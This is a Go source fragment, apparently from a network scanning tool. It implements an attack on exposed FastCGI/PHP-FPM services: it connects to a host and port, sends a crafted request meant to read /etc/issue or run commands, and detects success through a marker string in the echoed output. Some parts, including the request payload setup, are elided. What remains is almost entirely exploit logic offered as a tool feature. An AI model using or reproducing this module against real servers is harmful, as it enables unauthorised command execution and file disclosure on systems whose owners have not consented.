...
//learn from: https://github.com/wofeiwo/webcgi-exploits

func fcgiScan(info *config.InfoScan) {
	if info.Brute == false {
		return
	}
	path := "/etc/issue"
	...
	addr := fmt.Sprintf("%v:%v", info.Hosts, info.Ports)
	var reqParams string
	var cutLine = "-----ABCDEFG123456789-----\n"
	switch {
	...
	// create client
	fcgiClient, err := New(addr, config.Timeout)
	defer func() {
		if fcgiClient.rwc != nil {
			fcgiClient.rwc.Close()
		}
	}()
	if err != nil {
		errlog := fmt.Sprintf("[-] fcgi %v:%v %v", info.Hosts, info.Ports, err)
		common.LogError(errlog)
		return
	}
	// create request
	stdout, stderr, err := fcgiClient.Request(env, reqParams)
	if err != nil {
		errlog := fmt.Sprintf("[-] fcgi %v:%v %v", info.Hosts, info.Ports, err)
		common.LogError(errlog)
		return
	...
	if strings.Contains(output, cutLine) { //命令成功回显
		...
		if len(stderr) > 0 {
			result = fmt.Sprintf("[+] FCGI %v:%v \n%vstderr:%v\nplease try other path,as -rp /www/wwwroot/index.php", info.Hosts, info.Ports, output, string(stderr))
		} else {
			result = fmt.Sprintf("[+] FCGI %v:%v \n%v", info.Hosts, info.Ports, output)
		}
		common.LogSuccess(result)
	} else if strings.Contains(output, "File not found") || strings.Contains(output, "Content-type") || strings.Contains(output, "Status") {
		if len(stderr) > 0 {
			result = fmt.Sprintf("[+] FCGI %v:%v \n%vstderr:%v\nplesa try other path,as -path /www/wwwroot/index.php", info.Hosts, info.Ports, output, string(stderr))
		} else {
			result = fmt.Sprintf("[+] FCGI %v:%v \n%v", info.Hosts, info.Ports, output)
		}
		common.LogSuccess(result)
...
func New(addr string, timeout int64) (fcgi *FCGIClient, err error) {
	conn, err := common.TestTCPWithTimeout("tcp", addr, time.Duration(timeout)*time.Second)
	fcgi = &FCGIClient{
		rwc:       conn,
		keepAlive: false,
	}
